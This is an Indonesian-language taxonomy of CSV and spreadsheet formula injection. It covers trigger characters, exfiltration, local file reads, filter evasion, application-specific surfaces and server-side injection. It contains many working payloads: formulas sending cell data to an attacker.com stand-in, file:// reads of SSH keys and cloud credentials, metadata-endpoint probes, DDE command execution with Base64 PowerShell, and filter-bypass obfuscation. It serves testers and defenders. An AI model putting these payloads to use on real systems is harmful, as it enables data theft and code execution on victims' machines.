---
title: "CSV Formula Injection"
description: ""
---

## Struktur Klasifikasi

CSV/Formula Injection mengeksploitasi cacat desain fundamental dalam format file spreadsheet: **tidak adanya pemisahan antara data dan kode yang dapat dieksekusi**. Ketika aplikasi mengekspor input yang dikontrol pengguna ke dalam file CSV, TSV, atau spreadsheet (XLSX, ODS) tanpa netralisasi, dan file tersebut kemudian dibuka dalam aplikasi spreadsheet, sel apa pun yang diawali karakter trigger tertentu akan diinterpretasikan sebagai formula alih-alih string literal. Taksonomi ini mengorganisir seluruh permukaan serangan ke dalam tujuh kategori struktural berdasarkan **komponen mana dari rantai injeksi yang sedang dimutasi**.

**Sumbu 1 (Primer — Target Mutasi)** menyusun dokumen berdasarkan elemen spesifik yang dieksploitasi: sintaks trigger, saluran eksfiltrasi, metode akses sumber daya, teknik obfuskasi, perilaku spesifik aplikasi, konteks evaluasi sisi server, atau struktur level dokumen.

**Sumbu 2 (Cross-cutting — Persyaratan Interaksi)** mengklasifikasikan setiap subtipe berdasarkan tingkat interaksi korban yang diperlukan:

| Tingkat Interaksi | Deskripsi | Contoh |
|---|---|---|
| **Auto-execute** | Aktif saat file dibuka (mungkin memerlukan penolakan peringatan) | `=WEBSERVICE(...)` di Excel, `=IMPORTXML(...)` di Google Sheets |
| **Click-triggered** | Mengharuskan korban mengklik sel, tautan, atau elemen UI | Eksfiltrasi `=HYPERLINK(...)` |
| **Multi-step** | Mengharuskan mengaktifkan fitur eksternal (DDE, macro, Trust Center) | Eksekusi perintah DDE |
| **Passive** | Mengubah tampilan/konten tanpa aksi keluar | Manipulasi konten sel, teks phishing |

**Sumbu 3 (Pemetaan — Skenario Serangan)** menghubungkan teknik ke konteks deployment: sisi klien (korban membuka file yang diekspor), sisi server (aplikasi memproses spreadsheet yang diunggah), platform cloud (log poisoning → rantai ekspor), dan supply chain (kerentanan level library).

---

## §1. Primitif Trigger Formula

Titik masuk untuk semua serangan formula injection adalah sekumpulan karakter yang diinterpretasikan oleh aplikasi spreadsheet sebagai awal formula alih-alih nilai data. Memahami keseluruhan set karakter trigger — termasuk yang kurang dikenal — sangat penting karena sanitasi yang melewatkan satu trigger saja membuat keseluruhan pertahanan menjadi tidak efektif.

### §1-1. Formula Initiator Standar

Ini adalah karakter yang secara universal didokumentasikan sebagai trigger formula di berbagai aplikasi spreadsheet utama.

| Subtipe | Karakter | Mekanisme | Kondisi Utama |
|---|---|---|---|
| **Tanda sama dengan** | `=` | Prefix formula utama di semua aplikasi spreadsheet; semua yang mengikuti `=` di-parse sebagai ekspresi | Universal — bekerja di Excel, LibreOffice, Google Sheets, OpenOffice |
| **Tanda tambah** | `+` | Diinterpretasikan sebagai operator unary positif, menyebabkan sisanya dievaluasi sebagai ekspresi numerik atau formula | Excel, LibreOffice; dapat memicu evaluasi formula bar |
| **Tanda minus** | `-` | Diinterpretasikan sebagai operator negasi unary, memicu evaluasi ekspresi | Excel, LibreOffice; mekanisme yang sama dengan `+` |
| **Tanda at** | `@` | Di Excel modern (Office 365), `@` memanggil operator implicit intersection; di versi lama dan aplikasi lain, ia mengawali pemanggilan fungsi tertentu | Perilaku spesifik Excel bervariasi menurut versi; juga memicu dalam beberapa konteks LibreOffice |

### §1-2. Karakter Trigger yang Diperluas

Karakter-karakter ini kurang umum didokumentasikan tetapi dapat memulai interpretasi formula dalam kondisi tertentu. Karakter-karakter ini ditambahkan ke daftar sanitasi yang direkomendasikan OWASP dan penting untuk kelengkapan pertahanan.

| Subtipe | Karakter | Mekanisme | Kondisi Utama |
|---|---|---|---|
| **Karakter tab** | `0x09` | Ketika ditempatkan di awal nilai sel dalam field CSV yang dikutip, beberapa aplikasi spreadsheet menghapus tab dan mengevaluasi konten yang tersisa sebagai formula | Bergantung pada aplikasi; sangat relevan ketika tab digunakan sebagai prefix sanitasi dan kemudian dihapus saat disimpan ulang |
| **Carriage return** | `0x0D` | Mirip dengan tab — dapat dihapus selama parsing, mengekspos karakter trigger formula yang mengikutinya | Bergantung pada aplikasi; ditambahkan ke panduan OWASP bersama tab |
| **Newline dalam quoted field** | `0x0A` | Ketika field CSV dikutip dan mengandung newline, konten setelah newline mungkin memulai sel logis baru di beberapa parser, memungkinkan injeksi dalam apa yang tampak sebagai satu field | Bergantung pada parser; mengeksploitasi perbedaan kepatuhan RFC 4180 |

### §1-3. Pola Trigger Majemuk

Formula dapat dimulai melalui urutan karakter yang secara individual tampak tidak berbahaya tetapi digabungkan untuk memicu evaluasi.

| Subtipe | Pola | Mekanisme | Kondisi Utama |
|---|---|---|---|
| **Arithmetic prefix** | `+1+1+cmd\|'...'!A` | `+1+1` awal memicu evaluasi ekspresi; panggilan DDE yang dirantai dieksekusi dalam konteks ekspresi | Memerlukan pengenalan trigger `+` dan aktivasi DDE |
| **Function-prefixed** | `@SUM(1+1)*cmd\|'...'!A` | `@SUM` memulai evaluasi fungsi; operator perkalian dirantai ke pemanggilan DDE | Excel dengan DDE diaktifkan |
| **Quoted field escape** | `"=cmd\|'...'"` | Jika aplikasi menghapus tanda kutip di sekitar field selama impor CSV tetapi mempertahankan prefix `=`, formula menjadi aktif | Bergantung pada perilaku penanganan kutipan parser CSV |

---

## §2. Eksfiltrasi Data Berbasis Jaringan

Formula eksfiltrasi data mengekstrak informasi dari spreadsheet (atau dari sistem korban) dan mengirimkannya ke server yang dikontrol penyerang melalui saluran jaringan. Pembeda kritis antara subtipe adalah **persyaratan interaksi**: beberapa dieksekusi secara otomatis saat file dibuka, sementara yang lain memerlukan klik.

### §2-1. Eksfiltrasi Berbasis HYPERLINK (Click-Triggered)

Fungsi `HYPERLINK` membuat tautan yang dapat diklik dalam sel. Ketika URL tautan dibangun secara dinamis untuk menyertakan data dari sel lain, mengkliknya mengirimkan data tersebut ke server penyerang.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Basic cell leak** | `=HYPERLINK("http://attacker.com?d="&A1, "Click Here")` — menggabungkan nilai sel A1 ke dalam query string URL. Ketika diklik, browser berpindah ke URL, mengirimkan konten sel. | Mengharuskan korban mengklik tautan. Tidak ada prompt peringatan di sebagian besar aplikasi. |
| **Multi-cell exfiltration** | `=HYPERLINK("http://attacker.com?leak="&B2&B3&C2&C3, "Details")` — menggabungkan beberapa nilai sel, memungkinkan ekstraksi data massal dalam satu klik. | Persyaratan klik yang sama. Volume data dibatasi oleh panjang URL. |
| **Credential harvesting** | URL target HYPERLINK mengarah ke halaman phishing yang meyakinkan yang dirancang menyerupai portal login organisasi. Sel spreadsheet menampilkan teks yang terlihat tepercaya (misalnya, "View Full Report") sementara URL yang mendasarinya mengarahkan ke penyerang. | Social engineering — korban harus mengklik dan kemudian memasukkan kredensial di halaman phishing. |

**Keunggulan utama**: HYPERLINK tidak memicu dialog peringatan konten eksternal Excel. Eksfiltrasi tampak sebagai klik hyperlink normal, membuatnya jauh lebih tersembunyi dibandingkan serangan berbasis DDE.

### §2-2. Eksfiltrasi Berbasis WEBSERVICE (Auto-Execute)

Fungsi `WEBSERVICE` (tersedia di Excel 2013+, hanya Windows) membuat permintaan HTTP GET ke URL yang ditentukan dan mengembalikan badan respons sebagai nilai sel. Yang kritis, **ia dieksekusi secara otomatis ketika spreadsheet dibuka atau dihitung ulang**, tidak memerlukan klik selain membuka file.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Direct cell leak** | `=WEBSERVICE("http://attacker.com/?d="&A2)` — mengirimkan nilai sel A2 sebagai parameter URL via HTTP GET ketika sheet dibuka. | Excel 2013+ di Windows. Pengguna harus menolak peringatan "konten eksternal" awal. |
| **Chained request** | `=WEBSERVICE("http://attacker.com/?c="&WEBSERVICE("http://internal-service/api"))` — WEBSERVICE dalam mengambil dari layanan internal, dan yang luar mengeksfiltrasi respons ke penyerang. Efektif sebagai **client-side SSRF**. | Excel 2013+ + akses jaringan internal dari host korban. Memungkinkan reconnaissance API internal. |
| **ENCODEURL processing** | `=WEBSERVICE("http://attacker.com/?d="&ENCODEURL(A1))` — URL-encode konten sel untuk menangani karakter khusus yang akan merusak struktur URL. | Excel 2013+. Diperlukan untuk sel yang mengandung spasi, ampersand, atau karakter URL-tidak-aman lainnya. |
| **SUBSTITUTE sanitization** | `=WEBSERVICE(CONCAT("http://attacker.com/", SUBSTITUTE(A2, " ", "+")))` — menggantikan spasi dengan tanda tambah untuk menjaga validitas URL selama eksfiltrasi. | Excel 2013+. Pola umum untuk membersihkan data yang diekstrak sebelum transmisi. |

**Keterbatasan**: WEBSERVICE hanya mendukung protokol HTTP/HTTPS (bukan `file://`, `smb://`, atau skema lainnya). Byte NULL dalam data mengakhiri string URL, mencegah eksfiltrasi data biner. Port tertentu diblokir.

### §2-3. Rantai WEBSERVICE + FILTERXML (Ekstraksi Terstruktur)

`FILTERXML` (Excel 2013+) mem-parse XML menggunakan ekspresi XPath, memungkinkan ekstraksi bertarget dari respons XML/HTML yang diperoleh via WEBSERVICE.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **XPath extraction** | `=FILTERXML(WEBSERVICE("http://target/api.xml"), "//secret/text()")` — mengambil dokumen XML dan mengekstrak node tertentu menggunakan XPath, memungkinkan penargetan data yang tepat dari respons API terstruktur. | Excel 2013+. Target harus mengembalikan XML yang well-formed. |
| **Selective SSRF** | Menggabungkan WEBSERVICE untuk menjangkau layanan XML internal dengan FILTERXML untuk mengekstrak hanya field sensitif (kredensial, token, nilai konfigurasi) dari respons API yang verbose. | Layanan internal harus mengembalikan XML. Memungkinkan ekstraksi data yang presisi. |

### §2-4. Eksfiltrasi Out-of-Band Berbasis DNS

Ketika egress HTTP difilter, query DNS menawarkan saluran eksfiltrasi alternatif karena traffic DNS jarang diblokir.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **DNS via WEBSERVICE** | `=WEBSERVICE(CONCATENATE((SUBSTITUTE(MID((ENCODEURL('file:///etc/passwd'#$passwd.A19)),1,41),"%","-")),".<attacker-domain>"))` — membangun hostname dari konten file: `MID` mengekstrak rentang karakter, `ENCODEURL` menangani karakter khusus, `SUBSTITUTE` menggantikan `%` dengan `-` untuk kompatibilitas DNS, dan string akhirnya menjadi lookup DNS ke `<encoded-data>.attacker.com`. | LibreOffice (mendukung protokol `file://` untuk akses file lokal). Penyerang harus mengontrol server DNS autoritatif untuk menangkap query. |
| **Segmented extraction** | Beberapa formula di sel yang berbeda masing-masing mengekstrak rentang karakter yang berbeda (posisi 1-41, 42-82, dll.) menggunakan `MID`, memungkinkan ekstraksi file penuh melalui query DNS paralel dengan label subdomain sekuensial. | Sama seperti di atas. Memerlukan beberapa sel atau ekstraksi iteratif. Dibatasi ~41 karakter per label DNS. |

### §2-5. Fungsi Import Google Sheets (Auto-Execute)

Google Sheets menyediakan keluarga fungsi `IMPORT*` yang dirancang untuk agregasi data yang sah. Masing-masing membuat permintaan keluar ke URL yang ditentukan dan dapat dijadikan senjata untuk eksfiltrasi dengan menyematkan data yang dicuri dalam URL permintaan.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **IMPORTXML** | `=IMPORTXML("http://attacker.com/?d="&A1, "//a/@href")` — mengirimkan data sel sebagai parameter URL sambil meminta dokumen XML/HTML. Argumen kedua adalah ekspresi XPath untuk format respons yang diharapkan. | Google Sheets. Prompt otorisasi memperingatkan pengguna tentang akses sumber daya eksternal, tetapi permintaan dikirim saat disetujui. |
| **IMPORTHTML** | `=IMPORTHTML("http://attacker.com/?d="&A1, "table", 1)` — vektor eksfiltrasi serupa yang disamarkan sebagai impor tabel HTML. | Google Sheets + otorisasi pengguna. |
| **IMPORTFEED** | `=IMPORTFEED("http://attacker.com/feed?d="&A1)` — meminta umpan RSS/Atom dengan data yang dicuri yang disematkan. | Google Sheets + otorisasi pengguna. |
| **IMPORTDATA** | `=IMPORTDATA("http://attacker.com/data?d="&A1)` — mengambil data CSV/TSV dari URL, mengirimkan konten sel dalam permintaan. Digunakan untuk **eksfiltrasi live-streaming**: ketika nilai sel berubah, formula dievaluasi ulang dan mengirimkan data yang diperbarui. | Google Sheets + otorisasi pengguna. Memungkinkan pemantauan berkelanjutan saat sheet tetap terbuka. |
| **IMPORTRANGE** | `=IMPORTRANGE("spreadsheet_url", "Sheet1!A1:D10")` — mengakses data dari dokumen Google Sheets lain. Dapat digunakan untuk mengeksfiltrasi data lintas batas organisasi jika spreadsheet target dibagikan. | Memerlukan spreadsheet target untuk memberikan akses. Vektor kebocoran data lintas tenant. |
| **IMAGE** | `=IMAGE("http://attacker.com/pixel.png?d="&A1)` — memuat gambar dari URL yang dibangun dengan data yang dicuri. Pola tracking pixel memungkinkan eksfiltrasi diam-diam via permintaan gambar. | Google Sheets. Permintaan gambar terjadi secara otomatis. |

---

## §3. Akses Sumber Daya Lokal

Di luar eksfiltrasi jaringan, aplikasi spreadsheet tertentu memungkinkan formula membaca file lokal atau mengakses informasi sistem secara langsung, tanpa membuat permintaan jaringan keluar.

### §3-1. Akses Protokol File LibreOffice

LibreOffice Calc mendukung skema protokol `file://` dalam referensi sel, memungkinkan pembacaan langsung file lokal pada filesystem korban.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Direct file read** | `='file:///etc/passwd'#$passwd.A1` — membaca baris pertama `/etc/passwd` dengan mereferensikannya sebagai spreadsheet eksternal. Fragmen `#$passwd` menentukan nama sheet, dan `.A1` menentukan sel yang berisi baris pertama. | LibreOffice Calc di Linux/macOS. File harus dapat dibaca oleh pengguna yang menjalankan LibreOffice. |
| **Multi-line extraction** | Rantai referensi: `='file:///etc/passwd'#$passwd.A1` di sel B1, `='file:///etc/passwd'#$passwd.A2` di sel B2, dll. Setiap referensi mengekstrak baris berturut-turut dari file target. | Kondisi yang sama. Memerlukan satu formula per baris. |
| **Combined read + exfiltrate** | `=WEBSERVICE(CONCATENATE("http://attacker.com/",('file:///etc/passwd'#$passwd.A1)))` — membaca baris file lokal dan langsung mengirimkannya ke server penyerang via WEBSERVICE. Menggabungkan §3-1 dengan §2-2 untuk rantai baca-dan-eksfiltrasi formula tunggal. | LibreOffice Calc dengan dukungan WEBSERVICE. |
| **Configuration theft** | Targetkan file konfigurasi sensitif: `='file:///home/user/.ssh/id_rsa'#$id_rsa.A1` atau `='file:///home/user/.aws/credentials'#$credentials.A1` — mengekstrak kunci privat SSH atau kredensial cloud. | LibreOffice Calc. File harus berisi data teks yang dibatasi baris. |

### §3-2. Probing Layanan Internal via WEBSERVICE

Ketika WEBSERVICE dikombinasikan dengan target jaringan internal alih-alih server yang dikontrol penyerang, ia menjadi probe **client-side SSRF**.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Metadata endpoint access** | `=WEBSERVICE("http://169.254.169.254/latest/meta-data/")` — ketika korban berada di instance AWS EC2, ini membaca layanan metadata instance, mengekspos kredensial IAM, identitas instance, dan konfigurasi. | Korban harus berada di instance cloud dengan endpoint metadata yang dapat diakses. Excel 2013+ atau LibreOffice. |
| **Internal API discovery** | `=WEBSERVICE("http://internal-service.corp:8080/api/status")` — melakukan probe pada API internal yang dapat diakses dari jaringan korban tetapi tidak dari posisi eksternal penyerang. | Akses jaringan internal dari host korban. |
| **Port scanning** | Panggilan WEBSERVICE sekuensial ke `http://target:<port>/` di berbagai rentang port. Respons yang berhasil (atau perbedaan waktu dalam respons kesalahan) mengungkap layanan yang terbuka. | Tidak praktis dalam skala besar karena timeout yang panjang, tetapi layak untuk probing tertarget layanan internal yang diketahui. |

---

## §4. Obfuskasi Payload & Penghindaran Filter

Setelah vektor injeksi diidentifikasi, penyerang harus menghindari filter sanitasi, WAF, dan mesin antivirus yang memindai pola payload yang diketahui. Teknik obfuskasi memodifikasi tampilan sintaksis payload tanpa mengubah semantik eksekusinya.

### §4-1. Obfuskasi Prefix

Ekspresi arbitrer dapat ditambahkan sebelum perintah berbahaya. Mesin spreadsheet mengevaluasi seluruh rantai ekspresi, dan pemanggilan DDE tetap aktif terlepas dari aritmatika yang mendahuluinya.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Arithmetic prefix** | `=AAAA+BBBB-CCCC&"Hello"/12345&cmd\|'/c calc.exe'!A` — aritmatika yang tidak masuk akal dievaluasi tanpa bahaya; panggilan DDE di akhir tetap dieksekusi. Setiap sub-ekspresi bisa hingga 255 karakter. | DDE diaktifkan. Jumlah ekspresi prefix yang dirantai tidak terbatas. |
| **Function prefix** | `+thespanishinquisition(cmd\|'/c calc.exe'!A` — mengawali panggilan DDE dengan nama fungsi yang tidak ada. Panggilan fungsi gagal secara diam-diam, tetapi pemanggilan DDE tetap dipicu. | DDE diaktifkan. Nama fungsi bersifat arbitrer. |
| **Legitimate formula prefix** | `=1+1+cmd\|'/C calc'!A0` — menambahkan ekspresi aritmatika yang valid sehingga filter berbasis signature yang mencari pola `=cmd` gagal mencocokkan. | DDE diaktifkan. Bypass umum untuk filter pencocokan string yang naif. |

### §4-2. Obfuskasi Infix

Karakter yang disisipkan di dalam badan payload yang dihapus selama eksekusi.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Null byte injection** | `=C\x00m\x00D\|'/c calc'!A` — byte null (`0x00`) yang diselingi dalam nama perintah diabaikan oleh parser ekspresi. "Sebuah ekspresi dapat memiliki jumlah byte null yang tidak terbatas yang diselingi di dalamnya." | DDE diaktifkan. Byte null harus bertahan melalui parser CSV (bergantung pada encoding). |
| **Whitespace injection** | `=    C    m D \|'/c calc.exe'!A` — spasi yang disisipkan di antara karakter nama perintah. Spasi diabaikan dalam posisi tertentu (sebelum perintah, di antara argumen) tetapi memisahkan perintah jika ditempatkan dalam nama executable dalam beberapa konteks. | DDE diaktifkan. Kurang andal dibandingkan byte null; perilaku bervariasi menurut parser. |
| **Case randomization** | `=CmD\|'/c calc'!A`, `=CMD\|'/c calc'!A`, `=cMd\|'/c calc'!A` — nama perintah tidak case-sensitive di Windows, memungkinkan variasi huruf besar-kecil arbitrer untuk menghindari pencocokan signature yang case-sensitive. | DDE diaktifkan di Windows. Bypass sepele untuk pencocokan pola yang case-sensitive. |

### §4-3. Bypass Level Encoding

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Base64-encoded PowerShell** | `=cmd\|'/C powershell IEX([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("...")))'!A0` — perintah berbahaya sebenarnya di-encode dalam Base64 dalam pemanggilan PowerShell, mem-bypass filter berbasis konten yang memindai kata kunci seperti `Invoke-WebRequest` atau `DownloadString`. | DDE diaktifkan + PowerShell. Payload yang di-encode menghindari deteksi pencocokan string. |
| **UTF-7 encoding bypass** | Dalam skenario sisi server, payload XXE dapat di-encode dalam UTF-7 untuk mem-bypass validasi encoding XML yang hanya memeriksa signature UTF-8/UTF-16 (lihat §6-2). Regex yang memeriksa atribut encoding dapat dikalahkan dengan menambahkan whitespace di sekitar karakter `=`. | Pemrosesan XLSX sisi server dengan PhpSpreadsheet atau library serupa. |

### §4-4. Bypass Sanitasi Spesifik

Ini menargetkan implementasi pertahanan tertentu alih-alih deteksi generik.

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Apostrophe removal on re-save** | Ketika CSV dibuka di Excel, apostrophe awal (`'`) yang digunakan sebagai prefix sanitasi mungkin dihapus jika pengguna menyimpan file dan membukanya kembali. Formula yang sebelumnya di-escape menjadi aktif pada pembukaan kedua. | Pengguna harus menyimpan dan membuka ulang file. Melemahkan mitigasi yang paling umum direkomendasikan. |
| **Tab prefix stripping** | Mirip dengan apostrophe: karakter tab (`0x09`) yang digunakan sebagai prefix sanitasi mungkin dikonsumsi atau diabaikan oleh aplikasi spreadsheet tertentu, mengekspos ulang trigger formula. | Penanganan tab bergantung pada aplikasi. |
| **Quote-stripping parsers** | Jika parser CSV menghapus tanda kutip ganda di sekitar field (sesuai RFC 4180), field seperti `"=cmd\|..."` mungkin memiliki kutipannya dihapus, mengekspos trigger formula. | Bergantung pada implementasi parser CSV tertentu. |
| **Prepend bypass** | Riset MIT menemukan bahwa teknik validasi kode yang memeriksa apakah formula mengandung fungsi matematika yang valid sebelum mengeksekusinya dapat di-bypass dengan menambahkan string serangan dengan formula matematika yang sah (misalnya, `=1+1+<malicious-DDE>`). | Menargetkan pertahanan berbasis validasi alih-alih sanitasi berbasis prefix. |

---

## §5. Permukaan Serangan Spesifik Aplikasi

Aplikasi spreadsheet yang berbeda mendukung fungsi formula yang berbeda, memiliki model keamanan yang berbeda, dan menghadirkan permukaan serangan yang berbeda. Bagian ini memetakan matriks eksploitabilitas di berbagai aplikasi utama.

### §5-1. Microsoft Excel (Windows)

Aplikasi yang paling kaya fitur dan paling banyak ditarget. Permukaan serangan meliputi DDE, WEBSERVICE, FILTERXML, HYPERLINK, dan koneksi data eksternal.

| Fitur | Relevansi Serangan | Catatan Versi |
|---|---|---|
| **DDE** | Eksekusi perintah OS penuh (§2-1) | Dinonaktifkan secara default di Office 2021+/365. Diaktifkan secara default di versi lama. |
| **WEBSERVICE** | Permintaan HTTP auto-execute, client-side SSRF (§2-2) | Tersedia sejak Excel 2013. Hanya Windows. |
| **FILTERXML** | Ekstraksi XML terstruktur dari respons WEBSERVICE (§2-3) | Tersedia sejak Excel 2013. Hanya Windows. |
| **HYPERLINK** | Eksfiltrasi data yang dipicu klik (§2-1) | Semua versi. Tidak ada prompt keamanan. |
| **ENCODEURL** | URL encoding untuk payload eksfiltrasi (§2-2) | Tersedia sejak Excel 2013. |
| **Power Query** | Koneksi data eksternal yang mengambil data jarak jauh saat dibuka | Dapat dikonfigurasi untuk auto-refresh. Lingkungan enterprise mungkin mengaktifkan ini. |
| **MSHTML engine** | Kontrol ActiveX yang dirender dalam dokumen Office (CVE-2021-40444) | Dapat dieksploitasi untuk RCE melalui dokumen yang dibuat. Di-patch tetapi relevan untuk memahami permukaan serangan. |

### §5-2. LibreOffice Calc

Mendukung akses protokol file dan WEBSERVICE, menjadikannya aplikasi paling berbahaya untuk rantai eksfiltrasi file lokal.

| Fitur | Relevansi Serangan | Catatan |
|---|---|---|
| **Protokol file://** | Pembacaan file lokal langsung (§3-1) | Unik untuk LibreOffice. Memungkinkan ekstraksi `/etc/passwd`, kunci SSH, kredensial cloud. |
| **WEBSERVICE** | Eksfiltrasi HTTP (§2-2) | Tersedia di LibreOffice. Digabungkan dengan file:// untuk rantai baca-dan-eksfiltrasi. |
| **DDE** | Eksekusi perintah | Didukung sebagai protokol IPC warisan di Windows. |
| **Eksekusi macro** | Macro yang kompatibel VBA dalam file ODS/XLSX | Memerlukan aktivasi pengguna. |

### §5-3. Google Sheets

Tidak ada DDE atau akses file lokal, tetapi keluarga fungsi `IMPORT*` menyediakan kemampuan eksfiltrasi jaringan auto-executing yang kuat.

| Fitur | Relevansi Serangan | Catatan |
|---|---|---|
| **IMPORTXML** | Eksfiltrasi data OOB (§2-5) | Prompt otorisasi ditampilkan tetapi permintaan dikirim saat disetujui. |
| **IMPORTHTML** | Eksfiltrasi OOB yang disamarkan sebagai impor HTML (§2-5) | Prompt otorisasi yang sama. |
| **IMPORTFEED** | Eksfiltrasi OOB via permintaan RSS/Atom (§2-5) | Prompt otorisasi yang sama. |
| **IMPORTDATA** | Eksfiltrasi live-streaming (§2-5) | Dievaluasi ulang saat perubahan sel, memungkinkan pemantauan data berkelanjutan. |
| **IMPORTRANGE** | Akses data lintas spreadsheet (§2-5) | Memerlukan izin berbagi spreadsheet target. |
| **IMAGE** | Eksfiltrasi tracking pixel yang diam-diam (§2-5) | Pemuatan gambar terjadi secara otomatis. |
| **Bypass impor CSV** | Sanitasi Google Sheets (prefix apostrophe) yang diterapkan pada respons Google Forms **tidak** diterapkan saat mengimpor file CSV secara langsung, membiarkan formula tetap aktif. | Sanitasi yang tidak konsisten antara saluran input. |

---

## §6. Server-Side Spreadsheet Injection (SSSI)

Kelas serangan yang berbeda dan semakin penting di mana **server — bukan pengguna — yang mengevaluasi formula yang disuntikkan**. Ini membalikkan model ancaman tradisional: alih-alih menargetkan korban manusia yang membuka file, penyerang menargetkan pemrosesan otomatis sisi server dari unggahan spreadsheet.

### §6-1. Evaluasi Formula Sisi Server

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Konversi PDF/Gambar** | Aplikasi web yang menerima file CSV/XLSX yang diunggah dan mengonversinya ke format PDF atau gambar (untuk pratinjau, pencetakan, atau pengarsipan) sering menggunakan instance headless LibreOffice atau Excel untuk melakukan konversi. Selama rendering, formula dievaluasi, dan panggilan WEBSERVICE/DDE apa pun dieksekusi di server. | Aplikasi menggunakan LibreOffice/Excel sebagai mesin konversi. |
| **Pembuatan laporan** | Aplikasi yang mengimpor data spreadsheet untuk menghasilkan laporan dapat mengevaluasi formula untuk menghitung nilai turunan. Jika sel yang dikontrol pengguna mengandung formula yang disuntikkan, formula tersebut dieksekusi dalam konteks server dengan akses jaringan dan izin file tingkat server. | Aplikasi mengevaluasi formula alih-alih memperlakukan semua impor sebagai teks literal. |
| **Evaluasi real-time** | Aplikasi yang terintegrasi dengan G-Suite yang mengekspor data pengguna ke Google Sheets dapat memicu evaluasi formula ulang setiap kali sheet diakses oleh administrator. Formula `IMPORTDATA` yang disuntikkan memberikan streaming data yang diperbarui secara terus-menerus kepada penyerang. | Integrasi G-Suite/Google Sheets dengan auto-refresh. |
| **Cloud metadata via SSSI** | Ketika konversi sisi server berjalan di instance cloud (EC2, GCE, Azure VM), formula yang disuntikkan dapat mengakses endpoint metadata instance (`http://169.254.169.254/...`), mengeksfiltrasi kredensial IAM, dokumen identitas instance, dan variabel lingkungan. Post-exploitation dari kredensial cloud yang dicuri dapat meningkat ke kompromi infrastruktur penuh. | Server berjalan di instance cloud dengan layanan metadata yang dapat diakses. |

### §6-2. XML External Entity (XXE) via Library Spreadsheet

File XLSX adalah arsip ZIP yang berisi dokumen XML. Library sisi server yang mem-parse file XLSX mungkin rentan terhadap injeksi XXE melalui konten XML berbahaya yang disematkan dalam spreadsheet.

| Subtipe | Library | Mekanisme | CVE |
|---|---|---|---|
| **PhpSpreadsheet XXE** | PhpSpreadsheet (PHP) | Reader XLSX mem-parse konten XML tanpa menonaktifkan resolusi external entity. XLSX yang dibuat dengan mengandung deklarasi DOCTYPE dengan referensi external entity dapat membaca file sisi server atau memicu SSRF. | CVE-2024-45293, CVE-2018-19277 |
| **Encoding bypass** | PhpSpreadsheet (PHP) | Regex deteksi encoding scanner XML dapat di-bypass dengan menyisipkan whitespace di sekitar `=` dalam atribut `encoding`, memungkinkan payload XXE yang di-encode UTF-7 menghindari pemeriksaan keamanan. | CVE-2024-45293 |
| **openpyxl XXE** | openpyxl (Python) | Parser XML memproses external entity dalam file XLSX yang diunggah, memungkinkan pembacaan file dan SSRF dari server. | CVE-2017-5992 |
| **Pola umum** | Library apa pun yang mem-parse XML XLSX/ODS tanpa menonaktifkan pemrosesan DTD | Kerentanan fundamental adalah bahwa XLSX berbasis XML, dan konfigurasi parser XML default di banyak bahasa mengaktifkan resolusi external entity. | — |

### §6-3. Injeksi Sisi Server via File Log

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Cloud log poisoning** | Penyerang menyuntikkan payload formula ke dalam field penghasil log (header User-Agent, nama pengguna login, parameter API). Ketika administrator mengekspor log ini ke CSV untuk analisis dan membukanya di aplikasi spreadsheet, formula yang disuntikkan dieksekusi. Ini ditunjukkan terhadap log Azure di mana tidak diperlukan autentikasi — hanya pengetahuan nama pengguna yang valid. | Aplikasi mencatat input yang dikontrol pengguna. Administrator mengekspor dan membuka log di spreadsheet. |
| **Audit trail injection** | Pola serupa dalam log audit aplikasi, catatan transaksi, atau ekspor tiket dukungan di mana teks yang disediakan pengguna disertakan verbatim dalam ekspor CSV. | Aplikasi menyertakan input pengguna dalam data log/audit yang dapat diekspor tanpa sanitasi. |
| **Financial messaging field injection** | Sistem core banking yang menggunakan format pesan yang dibatasi koma (misalnya, pesan OFS Temenos T24) menerima input yang dikontrol pengguna ke dalam field transaksi. Pesan OFS menyusun field sebagai pasangan `FIELD.NAME:POSITION=VALUE` yang dipisahkan koma; menyuntikkan karakter delimiter atau penetapan field tambahan ke dalam nilai akan menimpa field downstream — mengubah jumlah transaksi, rekening penerima, atau flag persetujuan dalam pesan yang sama. Permukaan serangan meluas ke middleware keuangan apa pun yang membangun pesan yang dibatasi dari data yang sebagian dikontrol pengguna tanpa escaping tingkat field. | Aplikasi membangun pesan keuangan terstruktur (OFS, perakitan field ISO 8583, concatenation field SWIFT MT) dari input pengguna tanpa netralisasi delimiter. |

---

## §7. Format Pengiriman & Eksploitasi Parser

Format file yang digunakan untuk mengirimkan payload yang disuntikkan mempengaruhi teknik mana yang tersedia, bagaimana parsing terjadi, dan sanitasi apa yang diterapkan.

### §7-1. CSV (Comma-Separated Values)

| Subtipe | Mekanisme | Kondisi Utama |
|---|---|---|
| **Unquoted injection** | `malicious_name,=cmd\|'/C calc'!A0,other_data` — formula muncul sebagai nilai field biasa dalam CSV. Sebagian besar aplikasi spreadsheet langsung menginterpretasikan prefix `=`. | Kasus paling sederhana. Tidak ada quoting atau escaping yang harus diatasi. |
| **Quoted field injection** | `"normal","=cmd\|'/C calc'!A0","data"` — formula berada dalam field CSV yang dikutip. Aplikasi spreadsheet menghapus tanda kutip dan mengevaluasi formula. | Parser yang sesuai RFC 4180 menghapus tanda kutip dan meneruskan konten secara langsung. |
| **Field separator confusion** | Menyuntikkan koma atau titik koma dalam field yang dikutip untuk memanipulasi penyelarasan kolom, menyebabkan formula muncul di kolom yang berbeda dari yang diharapkan oleh logika sanitasi. | Mempengaruhi aplikasi yang men-sanitasi kolom tertentu (misalnya, "hanya sanitasi kolom nama") alih-alih semua field. |
